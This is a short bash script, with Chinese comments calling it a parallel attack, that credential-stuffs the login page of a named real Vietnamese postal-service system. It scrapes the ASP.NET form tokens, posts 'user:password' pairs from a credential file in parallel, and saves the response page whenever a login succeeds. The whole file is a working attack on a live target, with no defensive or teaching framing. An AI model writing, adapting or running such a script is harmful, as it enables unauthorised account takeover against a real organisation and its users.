#!/bin/bash
# 并行攻击VCKV系统

URL="http://vps.vnpost.vn/vckv/Login.aspx"

echo "[*] 获取表单数据..."
curl -sk "$URL" > /tmp/vckv_form.html
VS=$(grep -oP '(?<=__VIEWSTATE" value=")[^"]+' /tmp/vckv_form.html | head -1)
VSG=$(grep -oP '(?<=__VIEWSTATEGENERATOR" value=")[^"]+' /tmp/vckv_form.html | head -1)
EV=$(grep -oP '(?<=__EVENTVALIDATION" value=")[^"]+' /tmp/vckv_form.html | head -1)

echo "[*] 并行测试13个凭证..."

test_login() {
    local cred=$1
    local user=$(echo $cred | cut -d: -f1)
    local pass=$(echo $cred | cut -d: -f2)
    
    resp=$(curl -sk "$URL" -X POST -L \
        -d "__VIEWSTATE=$VS" \
        -d "__VIEWSTATEGENERATOR=$VSG" \
        -d "__EVENTVALIDATION=$EV" \
        -d "ctl00\$MainContent\$txtUser=$user" \
        -d "ctl00\$MainContent\$txtPassword=$pass" \
        -d "ctl00\$MainContent\$btnLogin=Đăng nhập")
    
    if echo "$resp" | grep -qi "logout\|index\.aspx\|thoát"; then
        echo "[🔥🔥🔥] 成功！$user:$pass"
        echo "$resp" > /tmp/vckv_success_$user.html
    fi
}

export -f test_login
export URL VS VSG EV

# 并行执行
cat expanded_creds.txt | xargs -P 5 -I {} bash -c 'test_login "{}"'

echo "[*] 并行测试完成"
